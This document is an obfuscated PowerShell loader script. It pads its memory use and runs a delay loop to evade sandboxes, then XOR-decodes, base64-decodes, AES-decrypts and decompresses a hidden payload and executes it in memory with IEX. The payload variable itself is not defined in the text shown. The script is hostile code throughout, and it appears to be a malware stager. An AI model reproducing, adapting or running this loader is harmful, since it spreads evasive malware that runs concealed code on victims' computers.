$wjzqgythkpxzpnxy = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($wjzqgythkpxzpnxy -lt 250) { $hqkiqhswkrwuk = "a" * 300MB }
$uywxoyjthiomj = 0
$ogjgnvuujv = 30000000
For ($uywxoyjthiomj=0; $uywxoyjthiomj -lt $ogjgnvuujv;$uywxoyjthiomj++) { $uywxoyjthiomj++ }
$troknhmjttv = [System.Text.Encoding]::UTF8.GetBytes("omzkrhmmwntojqtw")
$qkuhhprpzi = [System.Text.Encoding]::UTF8.GetBytes($gihsvunmtpgmotsi)
$rqmiutqkrg = $(for ($iwrtrswhkyiq = 0; $iwrtrswhkyiq -lt $qkuhhprpzi.length; ) {
    for ($mynszpqovu = 0; $mynszpqovu -lt $troknhmjttv.length; $mynszpqovu++) {
        $qkuhhprpzi[$iwrtrswhkyiq] -bxor $troknhmjttv[$mynszpqovu]
        $iwrtrswhkyiq++
        if ($iwrtrswhkyiq -ge $qkuhhprpzi.Length) {
            $mynszpqovu = $troknhmjttv.length
        }
    }
})
$rqmiutqkrg = [System.Text.Encoding]::UTF8.GetString($rqmiutqkrg)
$vhsytuhyyourzupno = "$rqmiutqkrg"
$iusruvmtnkrpyk = $vhsytuhyyourzupno.ToCharArray()
[array]::Reverse($iusruvmtnkrpyk)
$zppyhpnpqkhm = -join($iusruvmtnkrpyk)
$hkrgjwyvknvwkswq = [System.Convert]::FromBase64String("$zppyhpnpqkhm")
$ygqjhssgsvjz = [System.Convert]::FromBase64String("hznfMZ/ApTyy51fuvaaNnwvUgUU9x/qmaXIYJ/WNw88=")
$iwwjusnhxzyji = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$jqtgxxigptkhuwnw = $iwwjusnhxzyji.ToCharArray()
[array]::Reverse($jqtgxxigptkhuwnw)
$gtgunxvmykzjxmo = -join($jqtgxxigptkhuwnw)
$poyrsugqwikrrysqi = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($gtgunxvmykzjxmo))
$xuvkiytnsqqpmujzs = New-Object "$poyrsugqwikrrysqi"
$gyvnmrhjxposvpphk = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$xqssyywswuqmwtsg = $gyvnmrhjxposvpphk.ToCharArray()
[array]::Reverse($xqssyywswuqmwtsg)
$nijtzkjruzjsy = -join($xqssyywswuqmwtsg)
$pprnywvkptmirqyqs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($nijtzkjruzjsy))
$vqvumwhgguhmor = & ([scriptblock]::Create($pprnywvkptmirqyqs))
$xuvkiytnsqqpmujzs.Mode = $vqvumwhgguhmor
$jkqkwjszrjpn = "==gNyEDMx80UJpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$ojpgjjvqzqxr = $jkqkwjszrjpn.ToCharArray()
[array]::Reverse($ojpgjjvqzqxr)
$rjhugvygumhvxijm = -join($ojpgjjvqzqxr)
$ipjwwsysvzzjokyxo = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rjhugvygumhvxijm))
$hgkminwnqnq = & ([scriptblock]::Create($ipjwwsysvzzjokyxo))
$xuvkiytnsqqpmujzs.Padding = $hgkminwnqnq
$xuvkiytnsqqpmujzs.BlockSize = 128
$xuvkiytnsqqpmujzs.KeySize = 128
$xuvkiytnsqqpmujzs.Key = $ygqjhssgsvjz
$xuvkiytnsqqpmujzs.IV = $hkrgjwyvknvwkswq[0..15]
$yrkrzpuqpmijrqroi = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$oqiyiuhrwpo = New-Object $yrkrzpuqpmijrqroi(,$xuvkiytnsqqpmujzs.CreateDecryptor().TransformFinalBlock($hkrgjwyvknvwkswq,16,$hkrgjwyvknvwkswq.Length-16))
$qwuopypgnqoy = New-Object $yrkrzpuqpmijrqroi
$ugkpgomsmvrvuhug = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$vqvovuyhmsyzqy = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$onzwtszrwtnrj = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
$htmkzgttiusg = New-Object $onzwtszrwtnrj $oqiyiuhrwpo, ($vqvovuyhmsyzqy::$ugkpgomsmvrvuhug)
$htmkzgttiusg.CopyTo($qwuopypgnqoy)
$htmkzgttiusg.Close()
$xuvkiytnsqqpmujzs.Dispose()
$oqiyiuhrwpo.Close()
$tkrorjihtjny = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$ntnjkkqishz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$hzivoyqkvggrkhps = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$nushtoyonjp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$ontutxtjvxnugwk = $tkrorjihtjny::$ntnjkkqishz.$nushtoyonjp($qwuopypgnqoy.$hzivoyqkvggrkhps())
IEX($ontutxtjvxnugwk)